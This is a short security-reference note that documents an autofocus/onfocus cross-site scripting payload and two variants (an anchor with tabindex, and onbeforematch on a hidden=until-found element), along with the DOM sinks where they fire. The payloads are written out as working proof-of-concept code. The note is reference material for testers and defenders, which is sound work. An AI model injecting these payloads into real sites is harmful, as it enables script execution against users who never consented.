---
title: onfocus + autofocus (no interaction)
slug: focus-autofocus
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# onfocus + autofocus (no interaction)

## Payload

```html
<xss onfocus=alert(1) autofocus tabindex=1>
```

## Variants

```html
<a id=x tabindex=1 onfocus=alert(1)></a>
<xss id=x onbeforematch=alert(1) hidden=until-found>
```

## Context

`autofocus` causes the browser to immediately focus the element on parse, firing `onfocus` with no user interaction. Requires the element to be focusable (`tabindex` on non-native-focusable elements; `<a>` with `tabindex` also works). The `onbeforematch` variant fires when the browser's Find-in-page feature or scroll-to-text reveals a `hidden=until-found` element — no `autofocus` needed but requires URL fragment or browser Find. Sinks: `innerHTML`, `outerHTML`, `document.write`. Works cross-browser.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
